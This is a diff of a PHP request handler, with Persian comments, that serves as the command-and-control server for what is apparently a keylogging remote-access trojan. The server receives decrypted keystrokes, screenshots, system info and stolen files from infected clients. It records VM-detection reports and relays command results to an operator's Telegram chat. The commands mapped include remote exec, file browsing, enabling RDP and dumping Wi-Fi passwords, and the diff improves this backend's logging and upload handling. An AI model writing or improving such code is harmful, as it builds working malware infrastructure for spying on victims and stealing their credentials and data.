@@ -1,4 +1,5 @@
 <?php
+
 namespace Handlers;
 
 use Services\LoggerService;
@@ -31,7 +32,15 @@ class ClientRequestHandler
     {
         header('Content-Type: application/json');
         $data = array_merge($input, $_POST);
-        $this->logger->logWebhook("Client request data: " . json_encode($data));
+
+        // لاگ با فرمت بهتر
+        $logData = [
+            'action' => $data['action'] ?? 'unknown',
+            'client_id' => $data['client_id'] ?? 'unknown',
+            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
+            'timestamp' => date('Y-m-d H:i:s')
+        ];
+        $this->logger->logWebhook("Client request: " . json_encode($logData, JSON_UNESCAPED_UNICODE));
 
         $action = $data['action'] ?? null;
         $clientId = $data['client_id'] ?? null;
@@ -42,15 +51,35 @@ class ClientRequestHandler
             die(json_encode(['error' => 'Missing action or client_id']));
         }
 
+        // Validation
+        if (!$this->validateClientId($clientId)) {
+            http_response_code(400);
+            $this->logger->logError("Invalid client_id format: $clientId");
+            die(json_encode(['error' => 'Invalid client_id format']));
+        }
+
         $this->clientService->updateClientStatus($clientId, $_SERVER['REMOTE_ADDR'] ?? 'unknown');
 
         $response = $this->processAction($action, $clientId, $data);
-        $this->logger->logWebhook("Client response for action: $action, client_id: $clientId, response: " . json_encode($response));
+        $this->logger->logWebhook("Client response: " . json_encode([
+            'action' => $action,
+            'client_id' => $clientId,
+            'status' => $response['status'] ?? $response['error'] ?? 'unknown'
+        ]));
+
         echo json_encode($response);
+    }
+
+    private function validateClientId(string $clientId): bool
+    {
+        // فقط الفبا، اعداد، خط تیره و آندرلاین مجاز است
+        return preg_match('/^[a-zA-Z0-9_-]{1,32}$/', $clientId) === 1;
     }
 
     private function processAction(string $action, string $clientId, array $data): array
     {
+        $this->logger->logWebhook("Processing action: $action for client: $clientId");
+
         switch ($action) {
             case 'get_commands':
                 return $this->clientService->getClientCommands($clientId);
@@ -81,6 +110,7 @@ class ClientRequestHandler
             case 'upload_file':
                 return $this->handleUploadFile($clientId, $data);
             default:
+                $this->logger->logError("Unknown action: $action");
                 return ['error' => 'Unknown action'];
         }
     }
@@ -88,82 +118,95 @@ class ClientRequestHandler
     private function handleUploadFile(string $clientId, array $data): array
     {
         try {
-            $this->logger->logWebhook("File Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE) . ", FILES: " . json_encode($_FILES));
-            
+            $this->logger->logWebhook("File Upload START for client: $clientId");
+            $this->logger->logWebhook("POST data: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+            $this->logger->logWebhook("FILES data: " . json_encode($_FILES, JSON_UNESCAPED_UNICODE));
+
             if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
-                $this->logger->logError("File upload failed: No file provided or upload error for client_id: $clientId");
+                $error = $_FILES['file']['error'] ?? 'No file';
+                $this->logger->logError("File upload failed: error code $error for client_id: $clientId");
                 http_response_code(400);
-                return ['error' => 'No file provided or upload error'];
+                return ['error' => 'No file provided or upload error', 'error_code' => $error];
             }
 
             $filename = $_FILES['file']['name'] ?? 'unknown_file_' . time();
-            $filePath = Config::$UPLOAD_DIR . 'file_' . $clientId . '_' . time() . '_' . basename($filename);
-            
+            $fileSize = $_FILES['file']['size'] ?? 0;
+
+            // ساخت نام فایل امن
+            $safeFilename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
+            $filePath = Config::$UPLOAD_DIR . 'file_' . $clientId . '_' . time() . '_' . $safeFilename;
+
+            $this->logger->logWebhook("Attempting to move file to: $filePath");
+
             if (!move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
-                $this->logger->logError("Failed to save file for client_id: $clientId");
+                $this->logger->logError("Failed to move uploaded file for client_id: $clientId");
                 http_response_code(500);
                 return ['error' => 'Failed to save file'];
             }
 
-            $stmt = $this->pdo->prepare(
-                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
-                VALUES (?, 'file_upload', ?, NOW())"
-            );
-            $logMessage = json_encode([
-                'filename' => $filename,
-                'file_path' => $filePath,
-                'timestamp' => $data['timestamp'] ?? time()
-            ], JSON_UNESCAPED_UNICODE);
-            $stmt->execute([$clientId, $logMessage]);
+            $this->logger->logWebhook("File saved successfully: $filePath");
 
+            // ذخیره در جدول client_files
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_files (client_id, filename, file_path, file_size, created_at) 
+                VALUES (?, ?, ?, ?, NOW())"
+            );
+            $stmt->execute([$clientId, $filename, $filePath, $fileSize]);
+
+            $this->logger->logWebhook("File record inserted to database with ID: " . $this->pdo->lastInsertId());
+
+            // ارسال پیام به تلگرام
             $message = "📄 File Uploaded:\n";
             $message .= "Client ID: $clientId\n";
             $message .= "Filename: $filename\n";
+            $message .= "Size: " . round($fileSize / 1024, 2) . " KB\n";
             $message .= "Path: $filePath\n";
-            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+            $message .= "Time: " . date('Y-m-d H:i:s');
 
-            $this->logger->logWebhook("File uploaded successfully for client_id: $clientId, path: $filePath");
-            return ['status' => 'success', 'file_path' => $filePath];
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+            $this->logger->logWebhook("Telegram notification sent for file upload");
+
+            return [
+                'status' => 'success',
+                'file_path' => $filePath,
+                'file_id' => $this->pdo->lastInsertId()
+            ];
         } catch (\Exception $e) {
-            $this->logger->logError("File upload failed for client_id: $clientId, error: " . $e->getMessage());
+            $this->logger->logError("File upload exception for client_id: $clientId, error: " . $e->getMessage());
+            $this->logger->logError("Stack trace: " . $e->getTraceAsString());
             http_response_code(500);
             return ['error' => 'Upload failed: ' . $e->getMessage()];
         }
     }
 
-    // Other existing methods (handleUploadData, handleCommandResponse, etc.) remain unchanged
     private function handleUploadData(string $clientId, array $data): array
     {
         try {
-            $this->logger->logWebhook("Upload data: " . json_encode($data) . ", FILES: " . json_encode($_FILES));
+            $this->logger->logWebhook("Upload data START for client: $clientId");
+
             $keystrokes = '';
             if (isset($data['keystrokes']) && !empty($data['keystrokes'])) {
                 $keystrokes = $this->encryption->decrypt($data['keystrokes']);
-                if ($keystrokes === '') {
-                    $this->logger->logError("Keystrokes decryption failed or empty for client_id: $clientId");
-                }
+                $this->logger->logWebhook("Keystrokes decrypted: " . strlen($keystrokes) . " chars");
             }
 
             $systemInfo = '';
             if (isset($data['system_info']) && !empty($data['system_info'])) {
                 $systemInfo = $this->encryption->decrypt($data['system_info']);
-                if ($systemInfo === '') {
-                    $this->logger->logError("System_info decryption failed or empty for client_id: $clientId");
-                } else {
-                    $jsonCheck = json_decode($systemInfo, true);
-                    if (json_last_error() !== JSON_ERROR_NONE) {
-                        $this->logger->logError("System_info is not valid JSON for client_id: $clientId, data: " . substr($systemInfo, 0, 50));
-                        $systemInfo = '';
-                    }
+                if ($systemInfo && json_decode($systemInfo) === null) {
+                    $this->logger->logError("System_info is not valid JSON for client: $clientId");
                 }
+                $this->logger->logWebhook("System info decrypted: " . strlen($systemInfo) . " chars");
             }
 
             $screenshotPath = null;
             if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
                 $filename = 'screenshot_' . $clientId . '_' . time() . '.png';
                 $screenshotPath = Config::$SCREENSHOT_DIR . $filename;
-                if (!move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotPath)) {
-                    $this->logger->logError("Failed to save screenshot for client_id: $clientId");
+                if (move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotPath)) {
+                    $this->logger->logWebhook("Screenshot saved: $screenshotPath");
+                } else {
+                    $this->logger->logError("Failed to save screenshot for client: $clientId");
                     $screenshotPath = null;
                 }
             }
@@ -173,11 +216,17 @@ class ClientRequestHandler
                 VALUES (?, ?, ?, ?, NOW())"
             );
             $stmt->execute([$clientId, $keystrokes, $systemInfo, $screenshotPath]);
-            $this->logger->logCommand($clientId, 'upload_data', "Keystrokes: " . strlen($keystrokes) . " chars, System Info: " . strlen($systemInfo));
+
+            $this->logger->logCommand(
+                $clientId,
+                'upload_data',
+                "Keystrokes: " . strlen($keystrokes) . " chars, System Info: " . strlen($systemInfo) . " chars"
+            );
+            $this->logger->logWebhook("Upload data SUCCESS for client: $clientId");
 
             return ['status' => 'success'];
         } catch (\Exception $e) {
-            $this->logger->logError("Upload data failed for client_id: $clientId, error: " . $e->getMessage());
+            $this->logger->logError("Upload data failed for client: $clientId, error: " . $e->getMessage());
             http_response_code(500);
             return ['error' => 'Upload failed: ' . $e->getMessage()];
         }
@@ -188,62 +237,36 @@ class ClientRequestHandler
         try {
             $commandId = $data['command_id'] ?? null;
             $result = isset($data['result']) ? $this->encryption->decrypt($data['result']) : '';
+
             if (!$commandId) {
                 $this->logger->logError("Missing command_id in command response");
                 return ['error' => 'Missing command_id'];
             }
+
+            $this->logger->logWebhook("Command response received: command_id=$commandId, result_length=" . strlen($result));
 
             $resultData = json_decode($result, true);
             $stmt = $this->pdo->prepare(
                 "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
                 WHERE id = ?"
             );
-            $stmt->execute([strlen($result) > 65000 ? 'Result too large, sent as file' : $result, $commandId]);
+            $stmt->execute([strlen($result) > 65000 ? 'Result too large' : $result, $commandId]);
 
-            $stmt = $this->pdo->prepare(
-                "SELECT client_id, command FROM client_commands WHERE id = ?"
-            );
+            $stmt = $this->pdo->prepare("SELECT client_id, command FROM client_commands WHERE id = ?");
             $stmt->execute([$commandId]);
             $commandData = $stmt->fetch();
+
             if ($commandData) {
                 $decryptedCommand = $this->encryption->decrypt($commandData['command']);
                 $commandJson = json_decode($decryptedCommand, true);
                 $commandType = $commandJson['type'] ?? 'unknown';
-                $commandParams = $commandJson['params'] ?? [];
 
-                if ($commandType === 'file_operation' && isset($commandParams['action'])) {
-                    if ($commandParams['action'] === 'list' && isset($resultData['files'])) {
-                        $this->sendFileList($clientId, $resultData['files'], $commandParams['path']);
-                    } elseif ($commandParams['action'] === 'read' && isset($resultData['content'])) {
-                        $this->sendFileContent($clientId, $resultData['content'], $resultData['file_path']);
-                    } elseif ($commandParams['action'] === 'recursive_list' && isset($resultData['file_path'])) {
-                        $this->telegram->sendFile(Config::$ADMIN_CHAT_ID, $resultData['file_path']);
-                    } elseif ($commandParams['action'] === 'write' || $commandParams['action'] === 'delete') {
-                        $this->telegram->sendMessage(
-                            Config::$ADMIN_CHAT_ID,
-                            "Command '$commandType' ($commandParams[action]) completed for client $clientId: $result"
-                        );
-                    }
-                } elseif ($commandType === 'end_task' && isset($commandParams['process_name'])) {
-                    $message = "Command 'end_task' for process '{$commandParams['process_name']}' on client $clientId: ";
-                    $message .= isset($resultData['status']) && $resultData['status'] === 'success' ? "Successfully terminated." : "Failed - " . ($resultData['message'] ?? 'Unknown error');
-                    $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
-                } elseif ($commandType === 'enable_rdp' || $commandType === 'disable_rdp') {
-                    $status = isset($resultData['status']) && $resultData['status'] === 'success' ? 'successful' : 'failed';
-                    $port_status = $this->testPort($resultData['public_ip'] ?? 'unknown', 3389);
-                    $message = "Command '$commandType' on client $clientId: $status\n";
-                    $message .= "Details: " . ($resultData['message'] ?? 'No details') . "\n";
-                    $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed");
-                    $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
-                } else {
-                    $this->telegram->sendMessage(
-                        Config::$ADMIN_CHAT_ID,
-                        "Command '$commandType' result for client $clientId:\n" . ($result ?: 'No result')
-                    );
-                }
+                $this->logger->logWebhook("Processing command type: $commandType");
+
+                // پردازش بر اساس نوع دستور
+                $this->processCommandResult($clientId, $commandType, $commandJson['params'] ?? [], $resultData, $result);
             }
 
-            $this->logger->logWebhook("Updated command response for command_id: $commandId, result: " . substr($result, 0, 50));
             return ['status' => 'success'];
         } catch (\PDOException $e) {
             $this->logger->logError("Command response failed: " . $e->getMessage());
@@ -251,46 +274,122 @@ class ClientRequestHandler
         }
     }
 
+    private function processCommandResult(string $clientId, string $commandType, array $params, ?array $resultData, string $result)
+    {
+        // Try to extract command type from various sources
+        $actualCommandType = 'unknown';
+
+        // Method 1: Check if resultData contains command type
+        if ($resultData && isset($resultData['command_type'])) {
+            $actualCommandType = $resultData['command_type'];
+        }
+        // Method 2: Check if we have the original command data
+        elseif (isset($params['original_command'])) {
+            $actualCommandType = $this->detectCommandTypeFromOriginal($params['original_command']);
+        }
+        // Method 3: Use the stored commandType parameter
+        elseif ($commandType && $commandType !== 'unknown') {
+            $actualCommandType = $commandType;
+        }
+        // Method 4: Try to detect from result content
+        else {
+            $actualCommandType = $this->detectCommandTypeFromResult($result);
+        }
+
+        $message = "Command '$actualCommandType' result for client $clientId:\n";
+
+        if ($resultData && isset($resultData['status'])) {
+            $message .= "Status: {$resultData['status']}\n";
+            if (isset($resultData['message'])) {
+                $message .= "Message: {$resultData['message']}\n";
+            }
+        } else {
+            // For compressed results, indicate they're compressed
+            if (str_starts_with($result, 'H4sI')) {
+                $message .= "Result: [Compressed data - view in dashboard for details]\n";
+            } else {
+                // Truncate very large results
+                $displayResult = strlen($result) > 1000 ? substr($result, 0, 1000) . '... [truncated]' : $result;
+                $message .= "Result: $displayResult";
+            }
+        }
+
+        $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+    }
+
+    private function detectCommandTypeFromOriginal(string $originalCommand): string
+    {
+        $commandMap = [
+            '/status' => 'status',
+            '/screenshot' => 'capture_screenshot',
+            '/exec' => 'system_command',
+            '/browse' => 'file_operation',
+            '/get-info' => 'system_info',
+            '/go' => 'open_url',
+            '/shutdown' => 'system_command',
+            '/restart' => 'system_command',
+            '/sleep' => 'system_command',
+            '/signout' => 'system_command',
+            '/tasks' => 'process_management',
+            '/end_task' => 'end_task',
+            '/enable_rdp' => 'enable_rdp',
+            '/disable_rdp' => 'disable_rdp',
+            '/getwifipasswords' => 'get_wifi_passwords',
+        ];
+
+        foreach ($commandMap as $cmd => $type) {
+            if (str_starts_with($originalCommand, $cmd)) {
+                return $type;
+            }
+        }
+
+        return 'unknown';
+    }
+
+    private function detectCommandTypeFromResult(string $result): string
+    {
+        if (str_contains($result, 'wifi') || str_contains($result, 'Wi-Fi')) {
+            return 'get_wifi_passwords';
+        } elseif (str_contains($result, 'http') || str_contains($result, '://')) {
+            return 'open_url';
+        } elseif (str_contains($result, 'system') || str_contains($result, 'OS') || str_contains($result, 'Windows')) {
+            return 'system_info';
+        } elseif (str_contains($result, 'screenshot')) {
+            return 'capture_screenshot';
+        }
+
+        return 'unknown';
+    }
+
     private function handleUploadVMStatus(string $clientId, array $data): array
     {
         try {
-            $this->logger->logWebhook("Upload VM status: " . json_encode($data));
+            $this->logger->logWebhook("VM Status upload for client: $clientId");
+
             $vmDetails = '';
             if (isset($data['vm_details']) && !empty($data['vm_details'])) {
                 $vmDetails = $this->encryption->decrypt($data['vm_details']);
-                if ($vmDetails === '') {
-                    $this->logger->logError("VM details decryption failed or empty for client_id: $clientId");
-                } else {
-                    $jsonCheck = json_decode($vmDetails, true);
-                    if (json_last_error() !== JSON_ERROR_NONE) {
-                        $this->logger->logError("VM details is not valid JSON for client_id: $clientId, data: " . substr($vmDetails, 0, 50));
-                        $vmDetails = '';
-                    }
-                }
             }
 
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_vm_status (client_id, vm_details, created_at) 
-                VALUES (?, ?, NOW()) 
-                ON DUPLICATE KEY UPDATE vm_details = ?, created_at = NOW()"
+                VALUES (?, ?, NOW())"
             );
-            $stmt->execute([$clientId, $vmDetails, $vmDetails]);
+            $stmt->execute([$clientId, $vmDetails]);
 
             if ($vmDetails) {
                 $vmData = json_decode($vmDetails, true);
                 $isVM = $vmData['is_vm'] ?? false;
                 $message = $isVM
-                    ? "⚠️ Virtual Machine detected on client $clientId!\nDetails: " . json_encode($vmData['checks'], JSON_PRETTY_PRINT)
+                    ? "⚠️ Virtual Machine detected on client $clientId!"
                     : "✅ Physical Machine confirmed for client $clientId.";
                 $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
             }
 
-            $this->logger->logCommand($clientId, 'upload_vm_status', "VM Details: " . strlen($vmDetails) . " chars");
             return ['status' => 'success'];
         } catch (\Exception $e) {
-            $this->logger->logError("Upload VM status failed for client_id: $clientId, error: " . $e->getMessage());
-            http_response_code(500);
-            return ['error' => 'Upload failed: ' . $e->getMessage()];
+            $this->logger->logError("VM status upload failed: " . $e->getMessage());
+            return ['error' => 'Upload failed'];
         }
     }
 
@@ -740,4 +839,3 @@ class ClientRequestHandler
         }
     }
 }
-?>
